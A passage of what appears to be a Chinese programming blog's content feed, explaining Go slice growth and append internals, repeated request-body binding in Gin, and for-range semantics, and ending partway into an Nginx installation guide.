slice. It is therefore necessary to store the// result of append, often in the variable holding the slice itself:////slice = append(slice, elem1, elem2)//slice = append(slice, anotherSlice...)//// As a special case, it is legal to append a string to a byte slice, like this:////slice = append([]byte(&quot;hello &quot;), &quot;world&quot;...)func append(slice []Type, elems ...Type) []Type</code></pre><p>再看Append源码，首先判断当前slice长度i0与追加数据的总长度i1是否溢出，溢出则报错；接着，若i1小于&#x2F;等于slice的cap，直接返回原slice的起始及结束数据部分，否则，当前底层数组已无法存储所有的追加数据（如果索引 len-1 所指向的元素已经是底层数组的最后一个元素），会迁移到新的内存位置进行扩容处理；使用扩容后的容量构建新的slice，将原slice拷贝至新slice中。</p><pre><code>// refelct/value.go// grow grows the slice s so that it can hold extra more values, allocating// more capacity if needed. It also returns the old and new slice lengths.func grow(s Value, extra int) (Value, int, int) &#123;    i0 := s.Len()    i1 := i0 + extra    if i1 &lt; i0 &#123;        panic(&quot;reflect.Append: slice overflow&quot;)    &#125;    m := s.Cap()    if i1 &lt;= m &#123;        return s.Slice(0, i1), i0, i1    &#125;    if m == 0 &#123;        m = extra    &#125; else &#123;        const threshold = 256        for m &lt; i1 &#123;            if i0 &lt; threshold &#123;                m += m            &#125; else &#123;                m += (m + 3*threshold) / 4            &#125;        &#125;    &#125;    t := MakeSlice(s.Type(), i1, m)    Copy(t, s)    return t, i0, i1&#125;// Append appends the values x to a slice s and returns the resulting slice.// As in Go, each x&#39;s value must be assignable to the slice&#39;s element type.func Append(s Value, x ...Value) Value &#123;    s.mustBe(Slice)    s, i0, i1 := grow(s, len(x))    for i, j := i0, 0; i &lt; i1; i, j = i+1, j+1 &#123;        s.Index(i).Set(x[j])    &#125;    return s&#125;</code></pre><p>注意，<code>s.Index(i).Set(x[j])</code>，此时追加元素，向索引为当前切片长度值的位置设置值，因此，要注意make和append一起的使用。</p><p>例如下面的代码，info长度和容量都为10，前10个元素都为0，追加元素时，从尾部添加。因此，需要使用<code>info := make([]int,0,10)</code>或者<code>info := make([]int,0)</code>，设置长度为0。</p><pre><code>info := make([]int,10)info = append(info,1)fmt.Print(info)//output//[0 0 0 0 0 0 0 0 0 0 1]</code></pre><blockquote><p>go 1.18版本之前：当原 slice 容量小于 1024 的时候，新 slice 容量变成原来的 2 倍；原 slice 容量超过 1024，新 slice 容量变成原来的1.25倍。go 1.18版本之后：当原slice容量(oldcap)小于256的时候，新slice(newcap)容量为原来的2倍；原slice容量超过256，新slice容量newcap &#x3D; oldcap+(oldcap+3*256)&#x2F;4。但实际上，newcap 作了一个内存对齐<code>capmem = roundupsize(uintptr(newcap) * ptrSize)</code>（内存地址是所存储数据大小（按字节为单位）的整数倍，以便CPU可以一次将该数据从内存中读取出来），这和内存分配策略相关。进行内存对齐之后，新 slice 的容量是要 大于等于 按照前半部分生成的newcap。</p></blockquote><pre><code>// runtime/slice.gofunc growslice(et *_type, old slice, cap int) slice &#123;    // ……    newcap := old.cap    doublecap := newcap + newcap    if cap &gt; doublecap &#123;        newcap = cap    &#125; else &#123;        const threshold = 256        if old.cap &lt; threshold &#123;            newcap = doublecap        &#125; else &#123;            for 0 &lt; newcap &amp;&amp; newcap &lt; cap &#123;                // Transition from growing 2x for small slices                // to growing 1.25x for large slices. This formula                // gives a smooth-ish transition between the two.                newcap += (newcap + 3*threshold) / 4            &#125;            if newcap &lt;= 0 &#123;                newcap = cap            &#125;        &#125;    &#125;    // ……        capmem = roundupsize(uintptr(newcap) * ptrSize)    newcap = int(capmem / ptrSize)&#125;</code></pre><p>使用代码验证go1.18版本之后的扩容机制</p><pre><code>package mainimport &quot;fmt&quot;func main() &#123;    s := make([]int, 0)    oldCap := cap(s)    for i := 0; i &lt; 2048; i++ &#123;        s = append(s, i)        newCap := cap(s)        if newCap != oldCap &#123;   //容量不足时            fmt.Printf(&quot;[%d -&gt; %4d] cap = %-4d  |  after append %-4d  cap = %-4d\n&quot;, 0, i-1, oldCap, i, newCap)            oldCap = newCap        &#125;    &#125;&#125;</code></pre><p>输出：</p><pre><code>[0 -&gt;   -1] cap = 0     |  after append 0     cap = 1[0 -&gt;    0] cap = 1     |  after append 1     cap = 2[0 -&gt;    1] cap = 2     |  after append 2     cap = 4[0 -&gt;    3] cap = 4     |  after append 4     cap = 8[0 -&gt;    7] cap = 8     |  after append 8     cap = 16[0 -&gt;   15] cap = 16    |  after append 16    cap = 32[0 -&gt;   31] cap = 32    |  after append 32    cap = 64[0 -&gt;   63] cap = 64    |  after append 64    cap = 128[0 -&gt;  127] cap = 128   |  after append 128   cap = 256[0 -&gt;  255] cap = 256   |  after append 256   cap = 512[0 -&gt;  511] cap = 512   |  after append 512   cap = 848[0 -&gt;  847] cap = 848   |  after append 848   cap = 1280[0 -&gt; 1279] cap = 1280  |  after append 1280  cap = 1792[0 -&gt; 1791] cap = 1792  |  after append 1792  cap = 2560</code></pre><p>再看下面这段代码。</p><pre><code>func main() &#123;    s := []int&#123;1,2&#125;    s = append(s,4,5,6)    fmt.Printf(&quot;len=%d, cap=%d&quot;,len(s),cap(s))&#125;</code></pre><p>再看这段代码，这段代码和上面代码的输出一致吗？如果不一致，分别是什么？</p><pre><code>func main() &#123;    s := []int&#123;1, 2&#125;    s = append(s, 4)    s = append(s, 5)    s = append(s, 6)    fmt.Printf(&quot;len=%d, cap=%d&quot;, len(s), cap(s))&#125;</code></pre><p>第一段代码输出为：</p><pre><code>len=5, cap=6</code></pre><p>第二段代码输出为：</p><pre><code>len=5, cap=8</code></pre><p>为什么两段代码输出不一致？</p><p>两段代码中的s原来都只有2个元素，len和cap都为2。</p><ul><li><p>第一段代码一次append三个元素后，len变为5，cap最小要变成5，调用<code>growslice</code>函数时，传入<code>cap=5</code>，旧slice<code>old = []int&#123;1, 2&#125;</code>，因此doublecap为4，满足第一个if条件，<code>newcap</code>更新为5，接着调用<code>roundupsize(uintptr(newcap) * ptrSize)</code>，ptrSize是指一个指针的大小，在64位机上是8，查看roundupsize的源码，传入size &#x3D; 8*5 &#x3D; 40 &lt; smallSizeMax-8&#x3D;1016，因此计算<code>class_to_size[size_to_class8[(size+smallSizeDiv-1)/smallSizeDiv]]</code>，class_to_size通过 spanClass 获取 span划分的 object大小。而 size_to_class8 表示通过 size 获取它的 spanClass。<code>(size+smallSizeDiv-1)/smallSizeDiv = 5</code>，<code>size_to_class8[5] = 5</code>,<code>class_to_size[5] = 48</code>，因此<code>newcap = int(capmem / ptrSize) = 48/8 = 6</code>，新的slice容量为6。</p></li><li><p>第二段代码每次append一个元素，满足第二个if条件<code>cap &lt;= doublecap</code>，且旧slice容量小于256，因此直接分为doublecap，再进行内存对齐，最后为8。</p></li></ul><pre><code>// runtime/msize.gofunc roundupsize(size uintptr) uintptr &#123;    if size &lt; _MaxSmallSize &#123;        if size &lt;= smallSizeMax-8 &#123;            return uintptr(class_to_size[size_to_class8[(size+smallSizeDiv-1)/smallSizeDiv]])        &#125; else &#123;            //……        &#125;    &#125;    //……&#125;const _MaxSmallSize = 32768const smallSizeMax = 1024const smallSizeDiv = 8</code></pre><pre><code>var size_to_class8 = [smallSizeMax/smallSizeDiv + 1]uint8&#123;0, 1, 2, 3, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13, 14, 14, 15, 15, 16, 16, 17, 17, 18, 18, 19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 22, 22, 22, 22, 23, 23, 23, 23, 24, 24, 24, 24, 25, 25, 25, 25, 26, 26, 26, 26, 27, 27, 27, 27, 27, 27, 27, 27, 28, 28, 28, 28, 28, 28, 28, 28, 29, 29, 29, 29, 29, 29, 29, 29, 30, 30, 30, 30, 30, 30, 30, 30, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 31, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32&#125;var class_to_size = [_NumSizeClasses]uint16&#123;0, 8, 16, 24, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 288, 320, 352, 384, 416, 448, 480, 512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1408, 1536, 1792, 2048, 2304, 2688, 3072, 3200, 3456, 4096, 4864, 5376, 6144, 6528, 6784, 6912, 8192, 9472, 9728, 10240, 10880, 12288, 13568, 14336, 16384, 18432, 19072, 20480, 21760, 24576, 27264, 28672, 32768&#125;</code></pre><p>下面的代码输出什么？<a href="https://golang.design/go-questions/slice/vs-array/">数组与切片有什么异同</a></p><pre><code>package mainimport &quot;fmt&quot;func main() &#123;    slice := []int&#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125;    s1 := slice[2:5]    s2 := s1[2:6:7]    s2 = append(s2, 100)    s2 = append(s2, 200)    s1[2] = 20    fmt.Println(s1)    fmt.Println(s2)    fmt.Println(slice)&#125;</code></pre><p>输出：</p><pre><code>[2 3 20][4 5 6 7 100 200][0 1 2 3 20 5 6 7 100 9]</code></pre><p>Go 语言的函数参数传递，只有值传递，没有引用传递。如果传递给函数的是一个指针，指针的值（一个地址）会被复制，但指针的值所指向的地址上的值不会被复制，对指针类型而言，变量的值是指针，即传递的值也是指针，传递指针也是值传递。切片作为函数参数时，不管传的是 slice 还是 slice 指针，slice 结构体自身不会被改变，也就是说底层数据地址不会被改变。 但是通过指向底层数据的指针，可以改变切片的底层数据。通过 slice 的 array 字段就可以拿到数组的地址。在代码里，是直接通过类似 s[i]&#x3D;10 这种操作改变 slice 底层数组元素值。</p><pre><code>func main() &#123;    s := []int&#123;1, 1, 1&#125;    f(s)    fmt.Println(s)&#125;func f(s []int) &#123;    // i只是一个副本，不能改变s中元素的值    /*for _, i := range s &#123;        i++    &#125;    */    for i := range s &#123;        s[i] += 1    &#125;&#125;</code></pre><p>输出为：</p><pre><code>[2 2 2]</code></pre><p>要改变外层 slice，只有将返回的新的 slice 赋值到原始 slice，或者向函数传递一个指向 slice 的指针</p><pre><code>func myAppend(s []int) []int &#123;    // s为外部切片的拷贝，使用append返回新的切片，不影响外层函数的s    s = append(s, 100)    return s&#125;func myAppendPtr(s *[]int) &#123;    // 会改变外层 s 本身    *s = append(*s, 100)    return&#125;func main() &#123;    s := []int&#123;1, 1, 1&#125;    newS := myAppend(s)    fmt.Println(s)    fmt.Println(newS)    s = newS    myAppendPtr(&amp;s)    fmt.Println(s)&#125;</code></pre><p>输出：</p><pre><code>[1 1 1][1 1 1 100][1 1 1 100 100]</code></pre><p>参考资料：</p><p><a href="https://blog.csdn.net/xz_studying/article/details/106311831">深入了解Go Slice（一）—— make的详细处理过程</a><br><a href="https://blog.csdn.net/xz_studying/article/details/106483759">深入了解Go slice（二）—— append的处理过程</a><br><a href="https://learnku.com/docs/the-way-to-go/72-slice/3613">切片</a><br><a href="https://golang.design/go-questions/slice/vs-array/">数组与切片</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gin参数重复绑定 | Go</title>
      <link href="/technique/39.html"/>
      <url>/technique/39.html</url>
      
        <content type="html"><![CDATA[<p>使用Gin框架时，考虑一种场景：在自定义的中间件里面获取相关的参数进行参数解析和绑定，在路由API的内部也提取参数进行绑定。那么gin提供多次绑定同一参数的方法吗？</p><p>首先查看下面的代码<a href="https://www.nowcoder.com/feed/main/detail/8c593266724d48f990e3e25e7fd49c49?sourceSSR=users">gin对请求体类型为json的参数两次绑定</a>，使用c.ShouldBindJSON()方法，读取两次请求体的数据流，绑定至名为json的对象。</p><pre><code>import (    &quot;fmt&quot;    &quot;net/http&quot;    &quot;github.com/gin-gonic/gin&quot;)type Foo struct &#123;    Name string `json:&quot;name&quot; form:&quot;name&quot;`    Age  int    `json:&quot;age&quot; form:&quot;age&quot;`&#125;func main() &#123;    r := gin.Default()    // GET endpoint    r.GET(&quot;/ping&quot;, func(c *gin.Context) &#123;        c.JSON(http.StatusOK, gin.H&#123;            &quot;message&quot;: &quot;pong&quot;,        &#125;)    &#125;)    // POST endpoint    r.POST(&quot;/foo&quot;, func(c *gin.Context) &#123;        var json Foo        if err := c.ShouldBindJSON(&amp;json); err != nil &#123;            c.JSON(http.StatusBadRequest, gin.H&#123;                &quot;error&quot;: err.Error(),            &#125;)            return        &#125;        fmt.Printf(&quot;first: %v\n&quot;, json)        if err := c.ShouldBindJSON(&amp;json); err != nil &#123;            fmt.Println(&quot;Error:&quot;, err)            c.JSON(http.StatusBadRequest, gin.H&#123;                &quot;error&quot;: err.Error()&#125;)            return        &#125;        fmt.Printf(&quot;second: %v\n&quot;, json)        // Process the data        c.JSON(http.StatusOK, gin.H&#123;            &quot;name&quot;: json.Name,            &quot;age&quot;:  json.Age,        &#125;)    &#125;)    // Start the server on 0.0.0.0:8080    r.Run()&#125;</code></pre><p>构造请求体</p><pre><code>&#123;    &quot;name&quot;: &quot;Alice&quot;,    &quot;age&quot;: 12&#125;</code></pre><p>请求<code>http://127.0.0.1:8080/foo</code>接口，终端输出<code>EOF (End Of File)</code>错误：</p><pre><code>[GIN] 2024/07/03 - 16:47:47 | 400 |      1.2247ms |       127.0.0.1 | POST     &quot;/foo&quot;first: &#123;Alice 12&#125;Error: EOF</code></pre><p>【原因】：在 Gin 框架中，使用<code>application/json</code>格式的参数请求POST接口时，多次调用 <code>ShouldBind(&amp;data)</code> 或 <code>ShouldBindJSON(&amp;data)</code>方法，使用了c.Request.Body，会导致c.Request.Body(请求体的数据流)被读取多次。由于gin的Context中的Request.Body对象在第一次调用ShouldBind &#x2F; ShouldBindJSON 方法后已经被读取完毕，再次调用时已经到达了EOF，导致无法再次读取请求体。</p><p>那么，使用<code>application/form-data</code>格式的参数调用POST接口，结构体增加<code>form</code>映射，多次调用 <code>ShouldBind()</code>方法，结果如何？</p><pre><code>[GIN] 2024/07/03 - 17:21:44 | 200 |       4.942ms |       127.0.0.1 | POST     &quot;/foo&quot;first: &#123;Alice 12&#125;second: &#123;Alice 12&#125;</code></pre><p>可以发现，Gin 框架可以正常处理多次读取并绑定。原因如下<a href="https://github.com/gin-gonic/gin/pull/1341">1341</a>：</p><blockquote><p>Other formats, query &amp; forms, are already available to be called multiple times, because they uses parsed req.Form (url.Values) instead of req.Body.</p></blockquote><p>如何做到<code>application/json</code>格式的请求体被多次绑定呢？ 可以使用<code>ShouldBindBodyWith(&amp;data,binding.JSON)</code>方法。<code>ShouldBindBodyWith()</code>会在绑定之前将 c.Request.Body 存储到上下文中（这会对性能造成轻微影响，如果调用一次就能完成绑定的话，那就不要用这个方法，只有某些格式需要此功能，如 JSON, XML, MsgPack, ProtoBuf），再次调用时，复用存储在上下文中的body。</p><pre><code>if err := c.ShouldBindBodyWith(&amp;json,binding.JSON); err != nil &#123;    c.JSON(http.StatusBadRequest, gin.H&#123;        &quot;error&quot;: err.Error(),    &#125;)    return&#125;fmt.Printf(&quot;first: %v\n&quot;, json)if err := c.ShouldBindBodyWith(&amp;json,binding.JSON); err != nil &#123;    fmt.Println(&quot;Error:&quot;, err)    c.JSON(http.StatusBadRequest, gin.H&#123;        &quot;error&quot;: err.Error()&#125;)    return&#125;fmt.Printf(&quot;second: %v\n&quot;, json)</code></pre><p>输出为：</p><pre><code>[GIN] 2024/07/03 - 17:41:09 | 200 |       502.2µs |       127.0.0.1 | POST     &quot;/foo&quot;first: &#123;Alice 12&#125;second: &#123;Alice 12&#125;</code></pre><p>综上所述，当使用<code>application/json</code>格式的请求体调用POST接口时，使用<code>ShouldBind()</code> 或 <code>ShouldBindJSON()</code>会出现EOF错误，可以使用<code>ShouldBindBodyWith(&amp;data,binding.JSON)</code>方法进行正常的读取。<code>ShouldBindBodyWith(&amp;data,binding.JSON)</code>方法可以做类型判断兼容多种格式的请求体。</p><pre><code>if ctx.ContentType() == &quot;application/json&quot; &#123;    return ctx.ShouldBindBodyWith(data, binding.JSON)&#125;else if ctx.ContentType() == &quot;application/xml&quot;&#123;    return ctx.ShouldBindBodyWith(data, binding.XML)&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>for range 介绍 | Go</title>
      <link href="/technique/38.html"/>
      <url>/technique/38.html</url>
      
        <content type="html"><![CDATA[<p>【针对下文提到的循环变量问题，GO1.22已解决。GO1.21可以通过编译代码时在环境中设置GOEXPERIMENT&#x3D;loopvar，将新语义将应用于所有循环】</p><blockquote><p>For Go 1.22, we plan to change for loops to make these variables have per-iteration scope instead of per-loop scope. </p></blockquote><p><a href="https://go.dev/blog/loopvar-preview">具体说明</a></p><p>go常用的遍历方式，有for和for range。</p><p>针对go中的for循环，如下</p><pre><code>for i := 0; i &lt; 10; i++&#123;    //dosomething    fmt.Printf(&quot;%d &quot;, i)&#125;//output//0 1 2 3 4 5 6 7 8 9</code></pre><p>go中的for range如下，for-range 一般可以返回两个值，对于不同类型的data有不同的返回值，对于数组、切片和字符串，返回下标和值；对于map，返回key和value；对于chan，返回值。</p><p>数组</p><pre><code>//for range over an arrayarr := [3]int&#123;1,2,3&#125;for index,value := range arr&#123;    //dosomething    fmt.Printf(&quot;index: %d, value: %d \n&quot;, index, value)&#125;//output//index: 0, value: 1//index: 1, value: 2//index: 2, value: 3</code></pre><p>切片</p><pre><code>//for range over a slice.nums := []int&#123;1,2,3,4&#125;for index,value := range nums&#123;    //dosomething    fmt.Printf(&quot;index: %d, value: %d \n&quot;, index, value)&#125;//output//index: 0, value: 1//index: 1, value: 2//index: 2, value: 3//index: 3, value: 4</code></pre><p>字符串</p><pre><code>//for range over a stringstr := &quot;hello world&quot;for index,value := range str&#123;    //dosomething    fmt.Printf(&quot;index: %d, value: %c \n&quot;, index, value)&#125;//output//index: 0, value: h//index: 1, value: e//index: 2, value: l//index: 3, value: l//index: 4, value: o//index: 5, value://index: 6, value: w//index: 7, value: o//index: 8, value: r//index: 9, value: l//index: 10, value: d</code></pre><p>映射</p><pre><code>//for range over a mapuserMap := map[string]int&#123;    &quot;Alice&quot;: 18,    &quot;Bob&quot;: 20,    &quot;Lily&quot;: 16,&#125;for key,value := range userMap&#123;    //dosomething    fmt.Printf(&quot;key: %s, value: %d \n&quot;, key, value)&#125;//output//key: Lily, value: 16//key: Alice, value: 18//key: Bob, value: 20</code></pre><p>通道</p><pre><code>//for range over a channelch := make(chan int, 3)go func() &#123;    defer close(ch)    for i := 0; i &lt; 3; i++ &#123;        ch &lt;- i    &#125;&#125;()for value := range ch &#123;    //dosomething    fmt.Printf(&quot;value: %d\n&quot;, value)&#125;//value: 0//value: 1//value: 2</code></pre><p>也可以忽略返回值，见如下写法：</p><pre><code>slice := []int&#123;1, 2, 3&#125;// 1for range slice &#123;    fmt.Println()&#125;// 2for k := range slice &#123;    fmt.Println(k)&#125;// 3for k, v := range slice &#123;    fmt.Println(k, v)&#125;</code></pre><ul><li>1：因其range前没有接收变量，因此代表此次循环并不在意返回的索引以及数据，只关心循环次数。</li><li>2：因其range前仅有一个接收变量，因此代表此次循环仅关心返回的索引，不关心返回的数据，此代码等同于for k,_ :&#x3D; range slice</li><li>3：该方法是range的完全体使用形式，因此代表此次循环及关心返回的索引，也关心返回的数据。</li></ul><p>for range其实是一种语法糖，内部调用还是 for 循环，初始化会拷贝需要遍历的对象，每次对象的值赋值给同一个元素。（查看<a href="https://github.com/golang/gofrontend/blob/e387439bfd24d5e142874b8e68e7039f74c744d7/go/statements.cc#L5484">go编译源码</a>，伪代码如下。以array为例，<code>range_temp := range </code>在这里对原对象进行了拷贝，<code>value_temp = range_temp[index_temp]</code>每次是对同一个变量<code>value_temp</code>赋值。）</p><blockquote><p>语法糖（Syntactic Sugar）是指编程语言中的一种语法结构，这种结构并不会改变语言的功能或能力，而只是为了让代码的书写更加简洁、更易于理解。通常来说使用语法糖能够增加程序的可读性，从而减少程序代码出错的机会。举个例子：在 C 语言里用 a[i] 表示 *(a+i)，用 a[i][j] 表示 <em>(</em>(a+i)+j)</p></blockquote><p>数组</p><pre><code>//for range over an array//The loop we generate:len_temp := len(range)range_temp := rangefor index_temp = 0; index_temp &lt; len_temp; index_temp++ &#123;    value_temp = range_temp[index_temp]    index = index_temp    value = value_temp    original body&#125;</code></pre><p>切片</p><pre><code>//for range over a slice//The loop we generate:for_temp := rangelen_temp := len(for_temp)for index_temp = 0; index_temp &lt; len_temp; index_temp++ &#123;    value_temp = for_temp[index_temp]    index = index_temp    value = value_temp    original body&#125;</code></pre><p>字符串：不同的字符集，占用的长度不同，所以会对是否是utf8字符集字符进行判断，并进行不同的处理</p><pre><code>//for range over a string//The loop we generate:len_temp := len(range)var next_index_temp intfor index_temp = 0; index_temp &lt; len_temp; index_temp = next_index_temp &#123;    value_temp = rune(range[index_temp])    if value_temp &lt; utf8.RuneSelf &#123;        next_index_temp = index_temp + 1    &#125; else &#123;        value_temp, next_index_temp = decoderune(range, index_temp)    &#125;    index = index_temp    value = value_temp    // original body&#125;</code></pre><p>映射：map的遍历是无序的，同时不会指定次数</p><pre><code>//for range over a map//The loop we generate:var hiter map_iteration_structfor mapiterinit(type, range, &amp;hiter); hiter.key != nil; mapiternext(&amp;hiter) &#123;    index_temp = *hiter.key    value_temp = *hiter.val    index = index_temp    value = value_temp    original body&#125;</code></pre><p>通道：使用操作符&lt;-读取数据的，会对第二个值进行判断，所以可以保证for-range返回的值都是成功读取的值，当没有数据读取的时候，会因为操作符&lt;-阻塞。</p><pre><code>//for range over a channel//The loop we generate:for &#123;    index_temp, ok_temp = &lt;-range    if !ok_temp &#123;        break    &#125;    index = index_temp    original body&#125;</code></pre><p>考虑如下代码，遍历一个切片并将每次遍历的索引追加至切片，遍历会停止吗？  </p><pre><code>v := []int&#123;1, 2, 3&#125;for i := range v &#123;    v = append(v, i)&#125;</code></pre><p>【会停止】，遍历3次结束，结束后切片v为<code>[1 2 3 0 1 2]</code>。如上所述，遍历前对v做了拷贝，所以期间对原来v的修改不会反映到遍历中。</p><p>考虑如下代码，遍历一个数组并将变量的地址追加到切片，输出解引用后的切片元素，输出是什么？ </p><pre><code>arr := [2]int&#123;1, 2&#125;res := []*int&#123;&#125;for _, v := range arr &#123;    res = append(res, &amp;v)&#125;fmt.Println(*res[0],*res[1])//expect: 1 2//but output: 2 2fmt.Println(res[0],res[1])//0xc000014158 0xc000014158</code></pre><p>【输出为2 2】，可以发现，切片的每一个元素解引用后的值都是数组最后一个元素的值，也就是说，存储的地址是同一个。如上所述，go在for range遍历数组时，每次是对同一个变量<code>value_temp</code>赋值。因为<code>v</code>变量的地址在遍历过程中是不变的，切片元素存储同一个变量的地址，最后一次遍历，<code>v</code>变量值为2，因此最后的输出为<code>2 2</code>。</p><p>那么如何让输出变为<code>1 2</code>。</p><ul><li>使用局部变量拷贝v</li></ul><pre><code>arr := [2]int&#123;1, 2&#125;res := []*int&#123;&#125;for _, v := range arr &#123;    m := v    res = append(res, &amp;m)&#125;fmt.Println(*res[0],*res[1])fmt.Println(res[0],res[1])//output//1 2//0xc000014158 0xc000014160</code></pre><ul><li>直接通过索引获取原数组元素</li></ul><pre><code>arr := [2]int&#123;1, 2&#125;res := []*int&#123;&#125;for k := range arr &#123;    res = append(res, &amp;arr[k])&#125;fmt.Println(*res[0],*res[1])fmt.Println(res[0],res[1])//output//1 2//0xc0000a6130 0xc0000a6138</code></pre><p>遍历时，拷贝是深拷贝还是浅拷贝呢？首先，回忆一下什么是深拷贝和浅拷贝</p><blockquote><p>浅拷贝：是对对象的表面层次的复制。它创建一个新的对象，并复制原始对象的所有非引用类型字段的值。然而，对于引用类型的字段（如切片、映射、通道、接口和指向结构体或数组的指针），浅拷贝仅仅复制了引用的地址，而非引用的实际内容。这意味着新对象和原始对象共享相同的引用类型字段的数据。</p></blockquote><blockquote><p>深拷贝：是对对象的完全复制，包括对象引用的其他对象。它递归地遍历原始对象的所有字段，并创建新的内存空间来存储这些字段的值，包括引用类型字段所指向的实际数据。这样，深拷贝后的对象与原始对象在内存中是完全独立的，对其中一个对象的修改不会影响另一个对象。</p></blockquote><p>值类型和引用类型：</p><blockquote><p>值类型：变量直接存储值，内存通常在栈上分配，栈在函数调用完会被释放。比如：int、float、bool、string、array、sturct 等。</p></blockquote><blockquote><p>引用类型：变量存储的是一个地址（变量的值存储的是对最终值的引用），这个地址存储最终的值。内存通常在堆上分配，通过GC回收。</p></blockquote><p>也就是说，深拷贝和浅拷贝的主要区别在于它们处理<strong>引用类型</strong>字段的方式，浅拷贝仅仅复制了引用的地址，因此新对象和原始对象共享相同的数据。相反，深拷贝则创建了新的内存空间来存储引用类型字段的数据，确保新对象与原始对象完全独立。</p><p>以slice（切片）为例，slice实际上是一个结构体，包含长度、容量、指向底层数组的指针。底层数组是可以被多个 slice 同时指向的，因此对一个 slice 的元素进行操作是有可能影响到其他 slice 的。</p><pre><code>// runtime/slice.gotype slice struct &#123;    array unsafe.Pointer // 元素指针    len   int // 长度     cap   int // 容量&#125;</code></pre><p>如下代码所示，slice1拷贝至slice2，改变slice2第一个元素的值时，slice1也跟着变。因为Go的赋值为浅拷贝，仅拷贝了指针并没有拷贝指针指向的数组。Go函数的参数传递也是同样的，为值传递<a href="https://go.dev/doc/faq#pass_by_value">When are function parameters passed by value?</a>。</p><pre><code>slice1 := []int&#123;1, 2&#125;slice2 := slice1slice2[0] = 2fmt.Println(slice1)fmt.Println(slice2)//output//[2 2]//[2 2]</code></pre><p>对大数组这样遍历有问题吗？</p><pre><code>//假设值都为1，这里只赋值3个var arr = [102400]int&#123;1, 1, 1&#125;for i, n := range arr &#123;    //just ignore i and n for simplify the example    _ = i    _ = n&#125;</code></pre><p>【有问题】，遍历前的拷贝对内存是极大浪费。</p><p>如何优化：</p><ul><li>对数组取地址遍历for i, n :&#x3D; range &amp;arr</li><li>对数组做切片引用for i, n :&#x3D; range arr[:]</li></ul><p>类似地：对大量元素的 slice 和 map 遍历会有内存浪费问题吗？ 不会，浅拷贝仅拷贝指针。遍历slice时，实际上遍历的是一个指向底层数组的指针，而不会创建原始数组的拷贝。遍历map时，也是类似的情况，遍历的是指向底层哈希表的指针。</p><p>【输出2 2 2】</p><p>对 map 遍历时删除元素能遍历到么？</p><pre><code>    var m = map[int]int&#123;1: 1, 2: 2, 3: 3&#125;    //only del key once, and not del the current iteration key    var o sync.Once    for i := range m &#123;        o.Do(func() &#123;            for _, key := range []int&#123;1, 2, 3&#125; &#123;                if key != i &#123;                    fmt.Printf(&quot;when iteration key %d, del key %d\n&quot;, i, key)                    delete(m, key)                    break                &#125;            &#125;        &#125;)        fmt.Printf(&quot;key: %d value: %d &quot;, i, m[i])    &#125;</code></pre><p>输出（其中一种情况）</p><pre><code>when iteration key 1, del key 2key: 1 value: 1 key: 3 value: 3</code></pre><p>不会。map 内部实现是一个链式 hash 表，为保证每次无序，初始化时会随机一个遍历开始的位置, once.Do函数内保证第一次执行时删除未遍历的一个元素，因此删除的元素之后无法遍历到。</p><p>对 map 遍历时新增元素能遍历到么？</p><pre><code>var m = map[int]int&#123;1:1, 2:2, 3:3&#125;for i, _ := range m &#123;    m[4] = 4    fmt.Printf(&quot;key: %d value: %d &quot;, i, m[i])&#125;</code></pre><p>【可能会，输出中可能会有4 4】，注意是可能会。map迭代顺序是不确定的，有时候可能会包含新添加的键值对。</p><p>其中一部分输出：</p><pre><code>key: 1 value: 1 key: 2 value: 2 key: 3 value: 3key: 2 value: 2 key: 3 value: 3 key: 4 value: 4 key: 1 value: 1key: 1 value: 1 key: 2 value: 2 key: 3 value: 3 key: 4 value: 4key: 2 value: 2 key: 3 value: 3 key: 4 value: 4 key: 1 value: 1key: 1 value: 1 key: 2 value: 2 key: 3 value: 3 key: 4 value: 4key: 1 value: 1 key: 2 value: 2 key: 3 value: 3 key: 4 value: 4</code></pre><p>参考资料:</p><p><a href="https://mp.weixin.qq.com/s/rfbZ79TmZ61lx_JBnwDJMQ#">深挖 Go 之 for-range 排坑指南</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目开发-Nginx部署</title>
      <link href="/technique/35.html"/>
      <url>/technique/35.html</url>
      
        <content type="html"><![CDATA[<p>Nginx是一个开源（BSD许可）的异步框架的 Web 服务器，可以用作反向代理，负载均衡器和 HTTP 缓存。</p><h3 id="Nginx代理与反向代理"><a href="#Nginx代理与反向代理" class="headerlink" title="Nginx代理与反向代理"></a>Nginx代理与反向代理</h3><p>在Nginx代理中，Nginx服务器作为客户端和后端服务器之间的中间人，将客户端请求转发至后端服务器，并将后端服务器的响应返回给客户端。这种代理方式代替客户端发送请求，隐藏了真实的客户端，通常用于加速访问、缓存等目的。</p><p>在Nginx反向代理中，Nginx服务器作为后端服务器的代理，客户端请求先到达Nginx服务器，然后Nginx服务器再将请求转发至后端服务器。后端服务器将响应返回给Nginx服务器，再由Nginx服务器返回给客户端。这种代理方式通常用于隐藏后端服务器的真实IP地址、负载均衡、安全过滤等目的。</p><h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>在 Linux 系统上安装 Nginx 通常有以下几种方式：</p><ol><li><p>通过包管理工具安装：</p><ul><li>Debian&#x2F;Ubuntu 系统：可以使用 apt-get 命令安装 Nginx，命令为：<code>sudo apt-get install nginx</code></li><li>CentOS&#x2F;RHEL 系统：可以使用 yum 命令安装 Nginx，命令为：<code>sudo yum install nginx</code></li></ul></li><li><p>从源码编译安装：</p><ul><li>首先需要从 Nginx 官网下载源码包，并解压缩到本地</li><li>进入解压后的 Nginx 目录，执行 <code>./configure</code> 